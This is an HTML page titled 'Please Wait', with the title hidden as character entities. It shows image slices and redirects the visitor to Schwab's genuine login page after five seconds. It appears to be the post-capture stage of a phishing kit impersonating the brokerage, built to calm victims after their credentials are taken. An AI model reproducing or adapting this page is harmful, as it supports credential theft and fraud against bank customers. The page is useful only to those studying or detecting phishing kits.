<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#80;&#108;&#101;&#97;&#115;&#101;&#32;&#87;&#97;&#105;&#116;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<html><meta http-equiv="Refresh" content="05; url=https://www.schwab.com/public/schwab/nn/login/login.html&lang=en"></html>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:82px; z-index:0"><a href="#"><img src="images/w1.png" alt="" title="" border=0 width=1349 height=82></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:131px; top:522px; width:944px; height:216px; z-index:1"><img src="images/w11.png" alt="" title="" border=0 width=944 height=216></div>

<div id="image2" style="position:absolute; overflow:hidden; left:635px; top:316px; width:70px; height:70px; z-index:2"><img src="images/ft.gif" alt="" title="" border=0 width=70 height=70></div>

<div id="image3" style="position:absolute; overflow:hidden; left:222px; top:123px; width:463px; height:67px; z-index:3"><img src="images/b10.png" alt="" title="" border=0 width=463 height=67></div>

</div>

</body>
</html>
